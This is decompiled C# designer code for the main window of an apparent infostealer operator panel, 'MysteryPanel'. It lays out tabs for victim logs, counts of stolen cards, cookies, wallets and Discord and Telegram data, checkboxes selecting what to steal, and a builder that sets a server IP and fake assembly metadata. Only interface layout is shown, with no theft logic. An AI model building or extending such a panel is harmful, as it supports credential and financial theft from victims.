namespace MysteryPanel.App.Views
{
	// Token: 0x02000037 RID: 55
	public partial class MainView : global::MetroSet_UI.Forms.MetroSetForm, global::ReactiveUI.IViewFor<global::MysteryPanel.ViewModels.PanelViewModel>, global::ReactiveUI.IViewFor, global::ReactiveUI.IActivatable
	{
		// Token: 0x060001D0 RID: 464 RVA: 0x000036C5 File Offset: 0x000018C5
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x0000B774 File Offset: 0x00009974
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::MysteryPanel.App.Views.MainView));
			this.mainControlBox = new global::MetroSet_UI.Controls.MetroSetControlBox();
			this.mainStyle = new global::MetroSet_UI.StyleManager();
			this.pagesTabControl = new global::MetroSet_UI.Controls.MetroSetTabControl();
			this.profilePage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.metroSetDivider1 = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.switchLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.styleSwitcher = new global::MetroSet_UI.Controls.MetroSetSwitch();
			this.panelVersion = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.PanelDevider = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.panelLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.accountID = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.RegisterDate = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.AccountLogin = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.ActivateDate = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.AccountDevider = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.RegisterDevider = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.ActivateDevider = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.LoginDevider = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.accountIDLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.registerDateLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.activateDateLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.loginLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.logsPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.clearBtn = new global::System.Windows.Forms.Button();
			this.logsListView = new global::BrightIdeasSoftware.FastDataListView();
			this.UserName = new global::BrightIdeasSoftware.OLVColumn();
			this.ID = new global::BrightIdeasSoftware.OLVColumn();
			this.HardwareID = new global::BrightIdeasSoftware.OLVColumn();
			this.ClientIP = new global::BrightIdeasSoftware.OLVColumn();
			this.Country = new global::BrightIdeasSoftware.OLVColumn();
			this.SourceID = new global::BrightIdeasSoftware.OLVColumn();
			this.OperationSystem = new global::BrightIdeasSoftware.OLVColumn();
			this.Hardwares = new global::BrightIdeasSoftware.OLVColumn();
			this.LogTime = new global::BrightIdeasSoftware.OLVColumn();
			this.Languages = new global::BrightIdeasSoftware.OLVColumn();
			this.statsPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.totalRDP = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.winStoreCredMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.saveRDPToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.totalRDPLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalDesktopFiles = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalDesktopFilesLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalDiscord = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalDiscordLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCreditCards = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCreditCardsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalTelegram = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalTelegramLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.metroSetDivider3 = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.totalWinStore = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalWinStoreLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalFtps = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalFtpsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCookies = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCookiesLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalAccounts = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalAccountsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCrypto = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.totalCryptoLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.top10CountriesLb = new global::System.Windows.Forms.ListBox();
			this.metroSetLabel1 = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.worldMapPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.geoMapStat = new global::LiveCharts.WinForms.GeoMap();
			this.serverLogPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.serverLogs = new global::System.Windows.Forms.ListBox();
			this.buildSettingsPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.stealDiscord = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealDiscordLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealTelegram = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealTelegramLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealDesktop = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealFTPs = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealWinCreds = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealWallets = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.stealLogs = new global::MetroSet_UI.Controls.MetroSetCheckBox();
			this.desktopExtTb = new global::System.Windows.Forms.TextBox();
			this.addDesktopExtBtn = new global::System.Windows.Forms.Button();
			this.desktopExtList = new global::System.Windows.Forms.ListBox();
			this.desktopExtContextMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.deleteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.stealDesktopLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealFTPsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealWinCredsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealWalletsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.stealLogsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.domainSorterPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.metroSetDivider2 = new global::MetroSet_UI.Controls.MetroSetDivider();
			this.accountFormatterLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.domainFilterLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.domainFilter = new global::System.Windows.Forms.TextBox();
			this.browserDirBtn = new global::System.Windows.Forms.Button();
			this.logsLoading = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.accountFormatter = new global::System.Windows.Forms.TextBox();
			this.domainsLb = new global::System.Windows.Forms.ListBox();
			this.domainContextMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.saveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.pathToLogsLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.pathToLogs = new global::System.Windows.Forms.TextBox();
			this.cookieConvertPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.jsonBtn = new global::System.Windows.Forms.Button();
			this.netScapeBtn = new global::System.Windows.Forms.Button();
			this.builderPage = new global::MetroSet_UI.Child.MetroSetTabPage();
			this.assemblyIPLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyIP = new global::System.Windows.Forms.TextBox();
			this.assemblyOpenIconBtn = new global::System.Windows.Forms.Button();
			this.buildCreating = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblySourceIDLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblySourceID = new global::System.Windows.Forms.TextBox();
			this.assemblyPlatformLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyPlatform = new global::System.Windows.Forms.TextBox();
			this.assemblyIconLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyIcon = new global::System.Windows.Forms.TextBox();
			this.assemblyCopyrightLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyCopyright = new global::System.Windows.Forms.TextBox();
			this.assemblyVersionLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyVersion = new global::System.Windows.Forms.TextBox();
			this.assemblyCompanyLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyCompany = new global::System.Windows.Forms.TextBox();
			this.createBuildBtn = new global::System.Windows.Forms.Button();
			this.assemblyDescriptionLbl = new global::MetroSet_UI.Controls.MetroSetLabel();
			this.assemblyDescription = new global::System.Windows.Forms.TextBox();
			this.countryContextMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.listOfFoldersToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.appTray = new global::System.Windows.Forms.NotifyIcon(this.components);
			this.trayButton = new global::System.Windows.Forms.Button();
			this.pagesTabControl.SuspendLayout();
			this.profilePage.SuspendLayout();
			this.logsPage.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.logsListView).BeginInit();
			this.statsPage.SuspendLayout();
			this.winStoreCredMenu.SuspendLayout();
			this.worldMapPage.SuspendLayout();
			this.serverLogPage.SuspendLayout();
			this.buildSettingsPage.SuspendLayout();
			this.desktopExtContextMenu.SuspendLayout();
			this.domainSorterPage.SuspendLayout();
			this.domainContextMenu.SuspendLayout();
			this.cookieConvertPage.SuspendLayout();
			this.builderPage.SuspendLayout();
			this.countryContextMenu.SuspendLayout();
			base.SuspendLayout();
			this.mainControlBox.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.mainControlBox.CloseHoverBackColor = global::System.Drawing.Color.FromArgb(183, 40, 40);
			this.mainControlBox.CloseHoverForeColor = global::System.Drawing.Color.White;
			this.mainControlBox.CloseNormalForeColor = global::System.Drawing.Color.Gray;
			this.mainControlBox.CloseParent = true;
			this.mainControlBox.DisabledForeColor = global::System.Drawing.Color.Silver;
			this.mainControlBox.Location = new global::System.Drawing.Point(1127, 6);
			this.mainControlBox.MaximizeBox = false;
			this.mainControlBox.MaximizeHoverBackColor = global::System.Drawing.Color.FromArgb(238, 238, 238);
			this.mainControlBox.MaximizeHoverForeColor = global::System.Drawing.Color.Gray;
			this.mainControlBox.MaximizeNormalForeColor = global::System.Drawing.Color.Gray;
			this.mainControlBox.MinimizeBox = true;
			this.mainControlBox.MinimizeHoverBackColor = global::System.Drawing.Color.FromArgb(238, 238, 238);
			this.mainControlBox.MinimizeHoverForeColor = global::System.Drawing.Color.Gray;
			this.mainControlBox.MinimizeNormalForeColor = global::System.Drawing.Color.Gray;
			this.mainControlBox.Name = "mainControlBox";
			this.mainControlBox.Size = new global::System.Drawing.Size(100, 25);
			this.mainControlBox.Style = global::MetroSet_UI.Design.Style.Dark;
			this.mainControlBox.StyleManager = this.mainStyle;
			this.mainControlBox.TabIndex = 1;
			this.mainControlBox.ThemeAuthor = "Narwin";
			this.mainControlBox.ThemeName = "MetroDark";
			this.mainStyle.MetroForm = this;
			this.mainStyle.Style = global::MetroSet_UI.Design.Style.Dark;
			this.mainStyle.ThemeAuthor = "Narwin";
			this.mainStyle.ThemeName = "MetroDark";
			this.pagesTabControl.Controls.Add(this.profilePage);
			this.pagesTabControl.Controls.Add(this.logsPage);
			this.pagesTabControl.Controls.Add(this.statsPage);
			this.pagesTabControl.Controls.Add(this.worldMapPage);
			this.pagesTabControl.Controls.Add(this.serverLogPage);
			this.pagesTabControl.Controls.Add(this.buildSettingsPage);
			this.pagesTabControl.Controls.Add(this.domainSorterPage);
			this.pagesTabControl.Controls.Add(this.cookieConvertPage);
			this.pagesTabControl.Controls.Add(this.builderPage);
			this.pagesTabControl.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.pagesTabControl.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.pagesTabControl.Font = new global::System.Drawing.Font("Segoe UI", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.pagesTabControl.ItemSize = new global::System.Drawing.Size(100, 38);
			this.pagesTabControl.Location = new global::System.Drawing.Point(12, 70);
			this.pagesTabControl.Name = "pagesTabControl";
			this.pagesTabControl.SelectedIndex = 1;
			this.pagesTabControl.Size = new global::System.Drawing.Size(1210, 588);
			this.pagesTabControl.SizeMode = global::System.Windows.Forms.TabSizeMode.Fixed;
			this.pagesTabControl.Speed = 0;
			this.pagesTabControl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.pagesTabControl.StyleManager = this.mainStyle;
			this.pagesTabControl.TabIndex = 4;
			this.pagesTabControl.TabStyle = global::MetroSet_UI.Enums.TabStyle.Style2;
			this.pagesTabControl.ThemeAuthor = "Narwin";
			this.pagesTabControl.ThemeName = "MetroDark";
			this.pagesTabControl.UseAnimation = false;
			this.profilePage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.profilePage.Controls.Add(this.metroSetDivider1);
			this.profilePage.Controls.Add(this.switchLbl);
			this.profilePage.Controls.Add(this.styleSwitcher);
			this.profilePage.Controls.Add(this.panelVersion);
			this.profilePage.Controls.Add(this.PanelDevider);
			this.profilePage.Controls.Add(this.panelLbl);
			this.profilePage.Controls.Add(this.accountID);
			this.profilePage.Controls.Add(this.RegisterDate);
			this.profilePage.Controls.Add(this.AccountLogin);
			this.profilePage.Controls.Add(this.ActivateDate);
			this.profilePage.Controls.Add(this.AccountDevider);
			this.profilePage.Controls.Add(this.RegisterDevider);
			this.profilePage.Controls.Add(this.ActivateDevider);
			this.profilePage.Controls.Add(this.LoginDevider);
			this.profilePage.Controls.Add(this.accountIDLbl);
			this.profilePage.Controls.Add(this.registerDateLbl);
			this.profilePage.Controls.Add(this.activateDateLbl);
			this.profilePage.Controls.Add(this.loginLbl);
			this.profilePage.ImageIndex = 0;
			this.profilePage.ImageKey = null;
			this.profilePage.Location = new global::System.Drawing.Point(4, 42);
			this.profilePage.Name = "profilePage";
			this.profilePage.Size = new global::System.Drawing.Size(1202, 542);
			this.profilePage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.profilePage.StyleManager = this.mainStyle;
			this.profilePage.TabIndex = 1;
			this.profilePage.Text = "Profile";
			this.profilePage.ThemeAuthor = "Narwin";
			this.profilePage.ThemeName = "MetroDark";
			this.profilePage.ToolTipText = null;
			this.metroSetDivider1.Location = new global::System.Drawing.Point(146, 364);
			this.metroSetDivider1.Name = "metroSetDivider1";
			this.metroSetDivider1.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.metroSetDivider1.Size = new global::System.Drawing.Size(911, 4);
			this.metroSetDivider1.Style = global::MetroSet_UI.Design.Style.Dark;
			this.metroSetDivider1.StyleManager = this.mainStyle;
			this.metroSetDivider1.TabIndex = 17;
			this.metroSetDivider1.Text = "metroSetDivider4";
			this.metroSetDivider1.ThemeAuthor = "Narwin";
			this.metroSetDivider1.ThemeName = "MetroDark";
			this.metroSetDivider1.Thickness = 1;
			this.switchLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.switchLbl.Location = new global::System.Drawing.Point(146, 340);
			this.switchLbl.Name = "switchLbl";
			this.switchLbl.Size = new global::System.Drawing.Size(148, 22);
			this.switchLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.switchLbl.StyleManager = this.mainStyle;
			this.switchLbl.TabIndex = 16;
			this.switchLbl.Text = "Enable Light Theme:";
			this.switchLbl.ThemeAuthor = "Narwin";
			this.switchLbl.ThemeName = "MetroDark";
			this.styleSwitcher.BackColor = global::System.Drawing.Color.Transparent;
			this.styleSwitcher.BackgroundColor = global::System.Drawing.Color.Empty;
			this.styleSwitcher.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.styleSwitcher.CheckColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.styleSwitcher.CheckState = global::MetroSet_UI.Enums.CheckState.Unchecked;
			this.styleSwitcher.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.styleSwitcher.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.styleSwitcher.DisabledCheckColor = global::System.Drawing.Color.FromArgb(100, 65, 177, 225);
			this.styleSwitcher.DisabledUnCheckColor = global::System.Drawing.Color.FromArgb(200, 205, 205, 205);
			this.styleSwitcher.Location = new global::System.Drawing.Point(576, 340);
			this.styleSwitcher.Name = "styleSwitcher";
			this.styleSwitcher.Size = new global::System.Drawing.Size(58, 22);
			this.styleSwitcher.Style = global::MetroSet_UI.Design.Style.Dark;
			this.styleSwitcher.StyleManager = this.mainStyle;
			this.styleSwitcher.Switched = false;
			this.styleSwitcher.SymbolColor = global::System.Drawing.Color.FromArgb(92, 92, 92);
			this.styleSwitcher.TabIndex = 15;
			this.styleSwitcher.ThemeAuthor = "Narwin";
			this.styleSwitcher.ThemeName = "MetroDark";
			this.styleSwitcher.UnCheckColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.panelVersion.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.panelVersion.Location = new global::System.Drawing.Point(576, 300);
			this.panelVersion.Name = "panelVersion";
			this.panelVersion.Size = new global::System.Drawing.Size(106, 23);
			this.panelVersion.Style = global::MetroSet_UI.Design.Style.Dark;
			this.panelVersion.StyleManager = this.mainStyle;
			this.panelVersion.TabIndex = 14;
			this.panelVersion.Text = "NONE";
			this.panelVersion.ThemeAuthor = "Narwin";
			this.panelVersion.ThemeName = "MetroDark";
			this.PanelDevider.Location = new global::System.Drawing.Point(146, 325);
			this.PanelDevider.Name = "PanelDevider";
			this.PanelDevider.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.PanelDevider.Size = new global::System.Drawing.Size(911, 4);
			this.PanelDevider.Style = global::MetroSet_UI.Design.Style.Dark;
			this.PanelDevider.StyleManager = this.mainStyle;
			this.PanelDevider.TabIndex = 13;
			this.PanelDevider.Text = "metroSetDivider4";
			this.PanelDevider.ThemeAuthor = "Narwin";
			this.PanelDevider.ThemeName = "MetroDark";
			this.PanelDevider.Thickness = 1;
			this.panelLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.panelLbl.Location = new global::System.Drawing.Point(146, 300);
			this.panelLbl.Name = "panelLbl";
			this.panelLbl.Size = new global::System.Drawing.Size(115, 23);
			this.panelLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.panelLbl.StyleManager = this.mainStyle;
			this.panelLbl.TabIndex = 12;
			this.panelLbl.Text = "Panel Version:";
			this.panelLbl.ThemeAuthor = "Narwin";
			this.panelLbl.ThemeName = "MetroDark";
			this.accountID.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.accountID.Location = new global::System.Drawing.Point(576, 260);
			this.accountID.Name = "accountID";
			this.accountID.Size = new global::System.Drawing.Size(106, 23);
			this.accountID.Style = global::MetroSet_UI.Design.Style.Dark;
			this.accountID.StyleManager = this.mainStyle;
			this.accountID.TabIndex = 11;
			this.accountID.Text = "NONE";
			this.accountID.ThemeAuthor = "Narwin";
			this.accountID.ThemeName = "MetroDark";
			this.RegisterDate.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.RegisterDate.Location = new global::System.Drawing.Point(576, 220);
			this.RegisterDate.Name = "RegisterDate";
			this.RegisterDate.Size = new global::System.Drawing.Size(289, 23);
			this.RegisterDate.Style = global::MetroSet_UI.Design.Style.Dark;
			this.RegisterDate.StyleManager = this.mainStyle;
			this.RegisterDate.TabIndex = 10;
			this.RegisterDate.Text = "NONE";
			this.RegisterDate.ThemeAuthor = "Narwin";
			this.RegisterDate.ThemeName = "MetroDark";
			this.AccountLogin.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.AccountLogin.Location = new global::System.Drawing.Point(576, 140);
			this.AccountLogin.Name = "AccountLogin";
			this.AccountLogin.Size = new global::System.Drawing.Size(106, 23);
			this.AccountLogin.Style = global::MetroSet_UI.Design.Style.Dark;
			this.AccountLogin.StyleManager = this.mainStyle;
			this.AccountLogin.TabIndex = 9;
			this.AccountLogin.Text = "NONE";
			this.AccountLogin.ThemeAuthor = "Narwin";
			this.AccountLogin.ThemeName = "MetroDark";
			this.ActivateDate.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.ActivateDate.Location = new global::System.Drawing.Point(576, 180);
			this.ActivateDate.Name = "ActivateDate";
			this.ActivateDate.Size = new global::System.Drawing.Size(289, 23);
			this.ActivateDate.Style = global::MetroSet_UI.Design.Style.Dark;
			this.ActivateDate.StyleManager = this.mainStyle;
			this.ActivateDate.TabIndex = 8;
			this.ActivateDate.Text = "NONE";
			this.ActivateDate.ThemeAuthor = "Narwin";
			this.ActivateDate.ThemeName = "MetroDark";
			this.AccountDevider.Location = new global::System.Drawing.Point(146, 285);
			this.AccountDevider.Name = "AccountDevider";
			this.AccountDevider.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.AccountDevider.Size = new global::System.Drawing.Size(911, 4);
			this.AccountDevider.Style = global::MetroSet_UI.Design.Style.Dark;
			this.AccountDevider.StyleManager = this.mainStyle;
			this.AccountDevider.TabIndex = 7;
			this.AccountDevider.Text = "metroSetDivider4";
			this.AccountDevider.ThemeAuthor = "Narwin";
			this.AccountDevider.ThemeName = "MetroDark";
			this.AccountDevider.Thickness = 1;
			this.RegisterDevider.Location = new global::System.Drawing.Point(146, 245);
			this.RegisterDevider.Name = "RegisterDevider";
			this.RegisterDevider.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.RegisterDevider.Size = new global::System.Drawing.Size(911, 4);
			this.RegisterDevider.Style = global::MetroSet_UI.Design.Style.Dark;
			this.RegisterDevider.StyleManager = this.mainStyle;
			this.RegisterDevider.TabIndex = 6;
			this.RegisterDevider.Text = "metroSetDivider3";
			this.RegisterDevider.ThemeAuthor = "Narwin";
			this.RegisterDevider.ThemeName = "MetroDark";
			this.RegisterDevider.Thickness = 1;
			this.ActivateDevider.Location = new global::System.Drawing.Point(146, 205);
			this.ActivateDevider.Name = "ActivateDevider";
			this.ActivateDevider.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.ActivateDevider.Size = new global::System.Drawing.Size(911, 4);
			this.ActivateDevider.Style = global::MetroSet_UI.Design.Style.Dark;
			this.ActivateDevider.StyleManager = this.mainStyle;
			this.ActivateDevider.TabIndex = 5;
			this.ActivateDevider.Text = "metroSetDivider2";
			this.ActivateDevider.ThemeAuthor = "Narwin";
			this.ActivateDevider.ThemeName = "MetroDark";
			this.ActivateDevider.Thickness = 1;
			this.LoginDevider.Location = new global::System.Drawing.Point(146, 165);
			this.LoginDevider.Name = "LoginDevider";
			this.LoginDevider.Orientation = global::MetroSet_UI.Enums.DividerStyle.Horizontal;
			this.LoginDevider.Size = new global::System.Drawing.Size(911, 4);
			this.LoginDevider.Style = global::MetroSet_UI.Design.Style.Dark;
			this.LoginDevider.StyleManager = this.mainStyle;
			this.LoginDevider.TabIndex = 4;
			this.LoginDevider.Text = "metroSetDivider1";
			this.LoginDevider.ThemeAuthor = "Narwin";
			this.LoginDevider.ThemeName = "MetroDark";
			this.LoginDevider.Thickness = 1;
			this.accountIDLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.accountIDLbl.Location = new global::System.Drawing.Point(146, 260);
			this.accountIDLbl.Name = "accountIDLbl";
			this.accountIDLbl.Size = new global::System.Drawing.Size(83, 23);
			this.accountIDLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.accountIDLbl.StyleManager = this.mainStyle;
			this.accountIDLbl.TabIndex = 3;
			this.accountIDLbl.Text = "Account ID:";
			this.accountIDLbl.ThemeAuthor = "Narwin";
			this.accountIDLbl.ThemeName = "MetroDark";
			this.registerDateLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.registerDateLbl.Location = new global::System.Drawing.Point(146, 220);
			this.registerDateLbl.Name = "registerDateLbl";
			this.registerDateLbl.Size = new global::System.Drawing.Size(128, 23);
			this.registerDateLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.registerDateLbl.StyleManager = this.mainStyle;
			this.registerDateLbl.TabIndex = 2;
			this.registerDateLbl.Text = "Registration date:";
			this.registerDateLbl.ThemeAuthor = "Narwin";
			this.registerDateLbl.ThemeName = "MetroDark";
			this.activateDateLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.activateDateLbl.Location = new global::System.Drawing.Point(146, 180);
			this.activateDateLbl.Name = "activateDateLbl";
			this.activateDateLbl.Size = new global::System.Drawing.Size(106, 23);
			this.activateDateLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.activateDateLbl.StyleManager = this.mainStyle;
			this.activateDateLbl.TabIndex = 1;
			this.activateDateLbl.Text = "Activation date:";
			this.activateDateLbl.ThemeAuthor = "Narwin";
			this.activateDateLbl.ThemeName = "MetroDark";
			this.loginLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.loginLbl.Location = new global::System.Drawing.Point(146, 140);
			this.loginLbl.Name = "loginLbl";
			this.loginLbl.Size = new global::System.Drawing.Size(55, 23);
			this.loginLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.loginLbl.StyleManager = this.mainStyle;
			this.loginLbl.TabIndex = 0;
			this.loginLbl.Text = "Login:";
			this.loginLbl.ThemeAuthor = "Narwin";
			this.loginLbl.ThemeName = "MetroDark";
			this.logsPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.logsPage.Controls.Add(this.clearBtn);
			this.logsPage.Controls.Add(this.logsListView);
			this.logsPage.ImageIndex = 0;
			this.logsPage.ImageKey = null;
			this.logsPage.Location = new global::System.Drawing.Point(4, 42);
			this.logsPage.Name = "logsPage";
			this.logsPage.Size = new global::System.Drawing.Size(1202, 542);
			this.logsPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.logsPage.StyleManager = this.mainStyle;
			this.logsPage.TabIndex = 0;
			this.logsPage.Text = "Logs";
			this.logsPage.ThemeAuthor = "Narwin";
			this.logsPage.ThemeName = "MetroDark";
			this.logsPage.ToolTipText = null;
			this.clearBtn.BackColor = global::System.Drawing.Color.FromArgb(35, 147, 195);
			this.clearBtn.FlatAppearance.BorderSize = 0;
			this.clearBtn.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.clearBtn.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.clearBtn.Location = new global::System.Drawing.Point(-4, 516);
			this.clearBtn.Name = "clearBtn";
			this.clearBtn.Size = new global::System.Drawing.Size(79, 26);
			this.clearBtn.TabIndex = 9;
			this.clearBtn.Text = "Clear";
			this.clearBtn.UseVisualStyleBackColor = false;
			this.logsListView.AllColumns.Add(this.UserName);
			this.logsListView.AllColumns.Add(this.ID);
			this.logsListView.AllColumns.Add(this.HardwareID);
			this.logsListView.AllColumns.Add(this.ClientIP);
			this.logsListView.AllColumns.Add(this.Country);
			this.logsListView.AllColumns.Add(this.SourceID);
			this.logsListView.AllColumns.Add(this.OperationSystem);
			this.logsListView.AllColumns.Add(this.Hardwares);
			this.logsListView.AllColumns.Add(this.LogTime);
			this.logsListView.AllColumns.Add(this.Languages);
			this.logsListView.AutoGenerateColumns = false;
			this.logsListView.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.logsListView.BorderStyle = global::System.Windows.Forms.BorderStyle.FixedSingle;
			this.logsListView.CellEditUseWholeCell = false;
			this.logsListView.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.UserName,
				this.ID,
				this.HardwareID,
				this.ClientIP,
				this.Country,
				this.SourceID,
				this.OperationSystem,
				this.LogTime
			});
			this.logsListView.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.logsListView.DataSource = null;
			this.logsListView.EmptyListMsg = "";
			this.logsListView.EmptyListMsgFont = new global::System.Drawing.Font("Segoe UI", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.logsListView.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.logsListView.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.logsListView.FullRowSelect = true;
			this.logsListView.HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
			this.logsListView.Location = new global::System.Drawing.Point(0, 0);
			this.logsListView.MultiSelect = false;
			this.logsListView.Name = "logsListView";
			this.logsListView.SelectAllOnControlA = false;
			this.logsListView.ShowGroups = false;
			this.logsListView.Size = new global::System.Drawing.Size(1206, 510);
			this.logsListView.TabIndex = 4;
			this.logsListView.UseCompatibleStateImageBehavior = false;
			this.logsListView.UseFiltering = true;
			this.logsListView.UseHotControls = false;
			this.logsListView.UseNotifyPropertyChanged = true;
			this.logsListView.View = global::System.Windows.Forms.View.Details;
